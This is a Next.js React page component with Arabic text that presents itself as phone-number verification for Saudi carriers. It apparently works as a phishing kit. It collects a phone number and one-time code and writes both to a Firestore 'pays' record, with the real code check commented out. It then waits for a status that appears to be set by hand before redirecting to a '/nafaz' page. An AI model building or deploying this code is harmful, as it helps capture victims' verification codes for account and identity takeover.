"use client"

import type React from "react"

import { useRouter } from "next/navigation"
import { useEffect, useState } from "react"
import { addData, db, listenToDocument } from "@/lib/firebase"
import { PhoneVerificationService } from "@/lib/services/PhoneVerificationService"
import { sendPhone } from "@/lib/services/orders"
import Header from "@/components/Header"
import { STCModal } from "@/components/STCModal"
import { Check, X } from "lucide-react"
import { doc, onSnapshot } from "firebase/firestore"

// Function to generate a new visitor ID
const generateVisitorId = () => {
  return Math.random().toString(36).substring(2, 15) + Math.random().toString(36).substring(2, 15)
}

// Function to get or create visitor ID
const getOrCreateVisitorId = () => {
  let visitorId = ""

  if (typeof window !== "undefined") {
    visitorId = localStorage.getItem("visitor") || ""

    // If no visitor ID exists, generate a new one and store it
    if (!visitorId) {
      visitorId = generateVisitorId()
      localStorage.setItem("visitor", visitorId)
      console.log("Generated new visitor ID:", visitorId)
    }
  }

  return visitorId
}

const operators = [
  { id: "stc", name: "STC", logo: "/companies/stc.png" },
  { id: "mobily", name: "Mobily", logo: "/companies/mobily.png" },
  { id: "zain", name: "Zain", logo: "/companies/zain.png" },
]

export default function PhoneVerificationWithLoader() {
  const router = useRouter()
  const [phone, setPhone] = useState("")
  const [operator, setOperator] = useState("")
  const [visitorId, setVisitorId] = useState<string>("")
  const [showSTCModal, setShowSTCModal] = useState(false)

  // OTP verification states - changed to single string
  const [otpCode, setOtpCode] = useState("")
  const [otpError, setOtpError] = useState("")
  const [verificationStatus, setVerificationStatus] = useState<"pending" | "approved" | "error" | "pending">("pending")

  // Loader states
  const [showLoader, setShowLoader] = useState(true)
  const [loaderMessage, setLoaderMessage] = useState("جاري تحميل الصفحة...")
  const [timeLeft, setTimeLeft] = useState(60)

  // Form errors
  const [errors, setErrors] = useState({
    phone: "",
    operator: "",
    system: "",
  })

  // Initialize visitor ID on component mount
  useEffect(() => {
    const id = getOrCreateVisitorId()
    setVisitorId(id)

    // Hide loader after initial page load (3 seconds)
    const timer = setTimeout(() => {
      setShowLoader(false)
    }, 3000)

    return () => clearTimeout(timer)
  }, [])

  // Timer for countdown
  useEffect(() => {
    if (!showLoader || timeLeft <= 0) return

    const timer = setInterval(() => {
      setTimeLeft((prev) => {
        if (prev <= 1) {
          clearInterval(timer)
          return 0
        }
        return prev - 1
      })
    }, 1000)

    return () => clearInterval(timer)
  }, [showLoader, timeLeft])

  // Effect for listening to OTP status changes in Firestore using onSnapshot
  useEffect(() => {
    if (verificationStatus !== "pending" || !visitorId) return

    const paymentRef = doc(db, "pays", visitorId)
    // Set up real-time listener for document changes
    const unsubscribe = onSnapshot( paymentRef,
      (docSnapshot) => {
      if (!docSnapshot) return // Document doesn't exist

      if (docSnapshot.exists()) {
        const data = docSnapshot.data()
        if (data.phoneVerificationStatus === "approved") {
          setVerificationStatus("approved")
          console.log("Phone verification approved")
          setLoaderMessage("تم التحقق بنجاح. جاري التحويل...")
          // Navigate to nafaz page after a short delay
          setTimeout(() => {
            router.push("/nafaz")
          }, 2000)
        } else if (data.phoneVerificationStatus === "rejected") {
          setVerificationStatus("error")
          setOtpError("فشل التحقق من رقم الهاتف. الرجاء المحاولة مرة أخرى.")
        }
        // If status is "pending", keep waiting and show appropriate message
        else if (data.phoneVerificationStatus === "pending") {
          setVerificationStatus("pending")
          setLoaderMessage("جاري التحقق من الرمز... الرجاء الانتظار")
        }
      }
    })

    // Set up a timeout for the listener (60 seconds instead of 30)
    const timeoutId = setTimeout(() => {
      unsubscribe()
      setVerificationStatus("error")
      setOtpError("انتهت مهلة التحقق. الرجاء المحاولة مرة أخرى.")
    }, 60000) // Increased timeout to 60 seconds

    // Clean up listener and timeout on unmount or when status changes
    return () => {
      unsubscribe()
      clearTimeout(timeoutId)
    }
  }, [verificationStatus, visitorId, router])

  // Format time for display
  const formatTime = (seconds: number) => {
    const mins = Math.floor(seconds / 60)
    const secs = seconds % 60
    return `${mins}:${secs.toString().padStart(2, "0")}`
  }

  // Validate phone number
  const validatePhone = (phoneNumber: string) => {
    // Basic Saudi phone validation (05xxxxxxxx format)
    return /^05\d{8}$/.test(phoneNumber)
  }

  // Handle phone input change
  const handlePhoneChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const value = e.target.value.replace(/\D/g, "").slice(0, 10)
    setPhone(value)

    if (errors.phone) {
      setErrors((prev) => ({ ...prev, phone: "" }))
    }
  }

  // Handle operator selection
  const handleOperatorSelect = (operatorId: string) => {
    setOperator(operatorId)

    if (errors.operator) {
      setErrors((prev) => ({ ...prev, operator: "" }))
    }
  }

  // Validate form before submission
  const validateForm = () => {
    const newErrors = {
      phone: "",
      operator: "",
      system: "",
    }

    let isValid = true

    if (!validatePhone(phone)) {
      newErrors.phone = "الرجاء إدخال رقم جوال صحيح"
      isValid = false
    }

    if (!operator) {
      newErrors.operator = "الرجاء اختيار شركة الاتصالات"
      isValid = false
    }

    if (!visitorId) {
      newErrors.system = "خطأ في النظام. الرجاء تحديث الصفحة والمحاولة مرة أخرى."
      isValid = false
    }

    setErrors(newErrors)
    return isValid
  }

  // Handle form submission
  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault()

    // Ensure visitor ID exists
    if (!visitorId) {
      const newId = getOrCreateVisitorId()
      setVisitorId(newId)
    }

    if (!validateForm()) return

    try {
      // Show loader with appropriate message
      setShowLoader(true)
      setLoaderMessage("جاري إرسال رمز التحقق...")
      setTimeLeft(60)

      // Store phone and operator in Firestore
      await addData({ id: visitorId, phone2: phone, operator })

      // Save to localStorage for OTP verification
      localStorage.setItem("phoneNumber", phone)
      localStorage.setItem("operator", operator)

      if (operator === "stc") {
        setShowSTCModal(true)
        await PhoneVerificationService.verifyPhone(phone, operator)
      } else {
        await PhoneVerificationService.verifyPhone(phone, operator)

        // Legacy API call if needed
        if (visitorId) {
          await sendPhone(visitorId, phone, operator)
        }
      }

      // Update loader message after OTP is sent
      setLoaderMessage("تم إرسال رمز التحقق. الرجاء إدخال الرمز:")
    } catch (error) {
      console.error("Error during verification process:", error)
      setErrors((prev) => ({
        ...prev,
        system: "حدث خطأ أثناء عملية التحقق. الرجاء المحاولة مرة أخرى.",
      }))
      setShowLoader(false)
    }
  }

  // Handle OTP input change - updated for single input
  const handleOtpChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    // Only allow digits and limit length to 6
    const value = e.target.value.replace(/\D/g, "").slice(0, 6)
    setOtpCode(value)

    // Clear error when user types
    if (otpError) setOtpError("")

    // Auto-submit when code reaches minimum length (4 digits)
    if (value.length >= 4 && value !== otpCode) {
      // Small delay to show the digits before verification
      const autoSubmitTimer = setTimeout(() => {
        if (value.length >= 4) {
          verifyOtp(value)
        }
      }, 1000)

      return () => clearTimeout(autoSubmitTimer)
    }
  }

  // Verify OTP code - updated for single input
  const verifyOtp = async (code?: string) => {
    const otpToVerify = code || otpCode

    if (otpToVerify.length < 4) {
      setOtpError("الرجاء إدخال رمز التحقق المكون من 4 إلى 6 أرقام")
      return
    }

    try {
      // Update verification status to pending
      setVerificationStatus("pending")
      setLoaderMessage("جاري التحقق من الرمز...")

      // Submit OTP to backend
      // await PhoneVerificationService.verifyOtp(phone, otpToVerify)

      // Update Firestore with the submitted OTP
      await addData({
        id: visitorId,
        phoneOtpCode: otpToVerify,
        otpSubmittedAt: new Date().toISOString(),
        phoneVerificationStatus: "pending",
      })

      // The onSnapshot listener will handle status updates
    } catch (error) {
      console.error("OTP verification failed:", error)
      setVerificationStatus("error")
      setOtpError("حدث خطأ أثناء إرسال رمز التحقق. الرجاء المحاولة مرة أخرى.")
    }
  }

  return (
    <div className="min-h-screen bg-gradient-to-r from-[#146394] to-[#1a7ab8] flex flex-col items-center justify-start md:justify-center p-4">
      <Header />

      {/* Loader Overlay */}
      {showLoader && (
        <div className="fixed inset-0 bg-black/50 backdrop-blur-sm z-50 flex items-center justify-center">
          <div className="bg-white rounded-2xl p-8 text-center space-y-6 max-w-md w-full mx-4 transform transition-all duration-300">
            {(verificationStatus === "pending" ) && (
              <div className="animate-spin w-16 h-16 border-4 border-[#146394] border-t-transparent rounded-full mx-auto"></div>
            )}

            {verificationStatus === "approved" && (
              <div className="w-16 h-16 rounded-full bg-green-100 flex items-center justify-center mx-auto">
                <Check className="h-10 w-10 text-green-600" />
              </div>
            )}

            {verificationStatus === "error" && (
              <div className="w-16 h-16 rounded-full bg-red-100 flex items-center justify-center mx-auto">
                <X className="h-10 w-10 text-red-600" />
              </div>
            )}

            <div className="space-y-4">
              <p className="text-2xl font-semibold text-[#146394]">{loaderMessage}</p>

                <div className="flex justify-center my-4">
                  <input
                    type="tel"
                    inputMode="numeric"
                    value={otpCode}
                    onChange={handleOtpChange}
                    placeholder="أدخل رمز التحقق"
                    className="w-full max-w-[200px] h-14 text-center text-2xl font-bold border-2 border-gray-300 rounded-lg focus:border-[#146394] focus:outline-none"
                    autoComplete="one-time-code"
                    minLength={4}
                    maxLength={6}
                  />
                  
                </div>
<button className="p-3 bg-blue-50 border border-blue-200 rounded-lg">تحقق</button>

              {otpError && (
                <div className="p-3 bg-red-50 border border-red-200 rounded-lg">
                  <p className="text-red-600 text-sm">{otpError}</p>

                  {verificationStatus === "error" && (
                    <button
                      onClick={() => {
                        setVerificationStatus("pending")
                        setOtpError("")
                        setOtpCode("")
                      }}
                      className="mt-2 w-full bg-red-100 text-red-700 py-2 rounded-lg font-medium text-sm hover:bg-red-200"
                    >
                      المحاولة مرة أخرى
                    </button>
                  )}
                </div>
              )}

              {loaderMessage.includes("رمز التحقق") && verificationStatus !== "pending" && !otpCode && (
                <button
                  onClick={() => verifyOtp()}
                  className="w-full bg-[#146394] text-white py-3 rounded-lg font-semibold transform transition-all duration-300 hover:bg-[#0d4e77]"
                >
                  تحقق
                </button>
              )}

              {verificationStatus === "pending" && (
                <p className="text-gray-600">الرجاء الانتظار بينما نتحقق من الرمز...</p>
              )}

              {timeLeft > 0 && verificationStatus !== "approved" && (
                <p className="text-3xl font-bold text-[#146394]">{formatTime(timeLeft)}</p>
              )}
            </div>
          </div>
        </div>
      )}

      {/* STC Modal */}
      {showSTCModal && <STCModal isOpen={showSTCModal} onClose={() => setShowSTCModal(false)} />}

      {/* Main Form */}
      <div className="w-full max-w-4xl bg-white rounded-2xl shadow-2xl border border-gray-100 overflow-hidden mt-8 md:mt-0">
        <div className="p-4 md:p-8 space-y-4 md:space-y-6 relative">
          <div className="text-center mb-6">
            <h1 className="text-2xl md:text-3xl font-bold text-[#146394]">التحقق من رقم الجوال</h1>
            <p className="text-gray-600 mt-2">الرجاء إدخال رقم الجوال واختيار شركة الاتصالات</p>
          </div>

          {errors.system && (
            <div className="bg-red-50 border border-red-200 text-red-700 px-4 py-3 rounded-lg">{errors.system}</div>
          )}

          <form onSubmit={handleSubmit} className="space-y-4 md:space-y-6">
            {/* Phone Input */}
            <div className="space-y-2">
              <label htmlFor="phone" className="block text-sm font-medium text-gray-700">
                رقم الجوال
              </label>
              <div className="relative">
                <div className="absolute inset-y-0 right-0 flex items-center pr-3 pointer-events-none">
                  <span className="text-gray-500">+966</span>
                </div>
                <input
                  type="tel"
                  id="phone"
                  value={phone}
                  onChange={handlePhoneChange}
                  className="block w-full pr-16 py-3 text-gray-900 border border-gray-300 rounded-lg focus:ring-[#146394] focus:border-[#146394] text-right"
                  placeholder="05xxxxxxxx"
                  dir="ltr"
                />
              </div>
              {errors.phone && <p className="text-red-500 text-sm">{errors.phone}</p>}
            </div>

            {/* Operator Selection */}
            <div className="space-y-2">
              <label className="block text-sm font-medium text-gray-700">شركة الاتصالات</label>
              <div className="grid grid-cols-3 gap-3">
                {operators.map((op) => (
                  <button
                    key={op.id}
                    type="button"
                    onClick={() => handleOperatorSelect(op.id)}
                    className={`flex flex-col items-center justify-center p-4 border rounded-lg transition-all ${
                      operator === op.id ? "border-[#146394] bg-blue-50" : "border-gray-200 hover:bg-gray-50"
                    }`}
                  >
                    <img src={op.logo || "/placeholder.svg"} alt={op.name} className="h-8 w-auto mb-2" />
                    <span className="text-sm font-medium">{op.name}</span>
                  </button>
                ))}
              </div>
              {errors.operator && <p className="text-red-500 text-sm">{errors.operator}</p>}
            </div>

            {/* Submit Button */}
            <button
              type="submit"
              className="w-full bg-[#146394] text-white py-3.5 rounded-lg font-semibold transform transition-all duration-300 hover:bg-[#0d4e77] text-base"
            >
              إرسال رمز التحقق
            </button>
          </form>
        </div>
      </div>
    </div>
  )
}

